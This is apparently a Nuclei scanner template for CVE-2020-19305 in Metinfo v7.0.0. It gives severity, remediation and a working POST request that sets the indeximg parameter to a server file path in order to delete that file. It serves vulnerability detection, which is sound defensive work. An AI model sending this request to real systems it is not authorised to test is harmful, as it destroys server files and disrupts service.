id: CVE-2020-19305

info:
  name: Arbitrary File Deletion in Metinfo v7.0.0
  author: ProjectDiscoveryAI
  severity: critical
  description: An issue in /app/system/column/admin/index.class.php of Metinfo v7.0.0 allows attackers to escalate privileges by deleting arbitrary files via the indeximg parameter.
  impact: |
    An attacker can delete arbitrary files on the server, leading to data loss or service disruption.
  remediation: |
    Update Metinfo to version 7.0.1 or later to mitigate the arbitrary file deletion vulnerability (CVE-2020-19305).
  reference:
    - https://cwe.mitre.org/data/definitions/36.html
    - https://github.com/Live-Hack-CVE/CVE-2020-19305
    - https://github.com/MRdoulestar/MRdoulestar
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-19305
    cwe-id: CWE-22
    epss-score: 0.00368
    epss-percentile: 0.73296
    cpe: cpe:2.3:a:metinfo:metinfo:7.0.0:-:*:*:*:*:*:*
  metadata:
    vendor: metinfo
    product: metinfo

http:
  - method: POST
    path:
      - "{{BaseURL}}/admin/?n=column&c=index&a=doEditorsave"

    body: |
      id=79&wap_ok=0&no_order=0&name=yunsle&nav=0&new_windows=0&isshow=1&index_num=0&access=0&display=0&submit_type=save&indeximg=/var/www/metinfo/this_is_test.php

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "File deleted successfully"
        part: body
